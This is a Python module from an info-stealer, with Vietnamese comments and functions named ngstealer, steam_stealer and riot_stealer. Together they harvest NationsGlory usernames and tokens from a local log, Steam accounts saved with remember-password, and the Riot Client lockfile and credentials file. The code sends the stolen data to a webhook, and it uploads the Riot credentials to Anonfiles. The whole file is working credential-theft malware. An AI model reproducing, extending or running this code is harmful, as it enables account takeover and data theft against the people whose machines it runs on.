import os
import re
import json
import urllib.request
import shutil
from stealer.core import LoadUrlib, send_webhook, uploadToAnonfiles
from core.config import WEBHOOK_URL

def ngstealer(path):
    """Lấy thông tin tài khoản NationsGlory"""
    log_path = os.path.join(path, "000003.log")
    if not os.path.exists(log_path):
        return
    with open(log_path, "r", encoding="ansi", errors="ignore") as f:
        content = f.read()
    users = list(set(re.findall(r'{"username":"(.{1,69})","token":"', content)))
    servers = ["Blue","Orange","Yellow","White","Black","Cyan","Lime","Coral","Pink","Alpha","Sigma","Gamma","Omega","Purple","Green","Red","Delta","Ruby"]
    for user in users:
        try:
            req = urllib.request.Request(f"https://nationsglory.fr/profile/{user}", headers={"User-Agent": "Mozilla/5.0"})
            html = urllib.request.urlopen(req).read().decode()
            payload = []
            for server in servers:
                serv = server.lower()
                if f'data-server="{serv}"' in html:
                    parts = html.split(f'data-server="{serv}">')
                    if len(parts) < 2:
                        continue
                    data = parts[1].split('<div class="card server-tab d-none"')[0]
                    if "pas encore conn" not in data:
                        timeplayed = "N/A"
                        contry = "Unknown"
                        contryrank = "N/A"
                        # Trích xuất thời gian chơi
                        if "Temps de jeu" in data:
                            time_match = re.search(r'Temps de jeu</h4>\\n<p class="h3 mb-2">\\n(.*?)</p>', data, re.DOTALL)
                            if time_match:
                                timeplayed = time_match.group(1).strip()
                        # Trích xuất quốc gia
                        if '<a href="/country/' in data:
                            country_match = re.search(r'<a href="/country/[^"]+">(.*?)</a>', data)
                            if country_match:
                                contry = country_match.group(1)
                        # Trích xuất rank
                        rank_match = re.search(r'Rang de pays</h4>\\n<p class="h3 mb-2">(.*?)</p>', data, re.DOTALL)
                        if rank_match:
                            contryrank = rank_match.group(1).strip()
                        if "h" in timeplayed:
                            payload.append({
                                "name": f":flag_{contry.lower()}: {server}",
                                "value": f"PlayTime: {timeplayed}\nRank: {contryrank}",
                                "inline": True
                            })
            if payload:
                embed = {
                    "title": f"NationsGlory - {user}",
                    "thumbnail": {"url": f"https://skins.nationsglory.fr/face/{user}/16"},
                    "fields": payload
                }
                data = {"embeds": [embed], "username": "Stealer"}
                LoadUrlib(WEBHOOK_URL, data=json.dumps(data).encode(), headers={"Content-Type": "application/json"})
        except Exception as e:
            print(f"Error ngstealer: {e}")

def steam_stealer():
    """Lấy session Steam (nếu có remember password)"""
    steam_config = os.path.join(os.environ.get("PROGRAMFILES(X86)", "C:\\Program Files (x86)"), "Steam", "config")
    loginusers = os.path.join(steam_config, "loginusers.vdf")
    if not os.path.exists(loginusers):
        return
    with open(loginusers, "r", encoding="utf8", errors="ignore") as f:
        content = f.read()
    # Tìm tài khoản có RememberPassword = 1
    pattern = r'"(\d+)"\s*\{\s*"AccountName"\s*"([^"]+)"\s*"PersonaName"\s*"([^"]+)"\s*"RememberPassword"\s*"(\d+)"'
    users = re.findall(pattern, content)
    found = []
    for uid, acc, persona, remember in users:
        if remember == "1":
            found.append(f"SteamID: {uid}, Account: {acc}, Persona: {persona}")
    if found:
        send_webhook("Steam accounts with remember password:\n" + "\n".join(found))

def riot_stealer(local_appdata):
    """Lấy thông tin Riot Client"""
    riot_data = os.path.join(local_appdata, "Riot Games", "Riot Client", "Data")
    if not os.path.exists(riot_data):
        return
    lockfile = os.path.join(riot_data, "lockfile")
    if os.path.exists(lockfile):
        with open(lockfile, "r") as f:
            content = f.read()
        send_webhook(f"Riot Client lockfile: {content}")
    # Thử tìm credentials
    creds = os.path.join(riot_data, "Credentials")
    if os.path.exists(creds):
        temp_creds = os.path.join(os.environ["TEMP"], "riot_creds.txt")
        shutil.copy2(creds, temp_creds)
        url = uploadToAnonfiles(temp_creds)
        if url:
            send_webhook(f"Riot Client credentials uploaded: {url}")
        try:
            os.remove(temp_creds)
        except:
            pass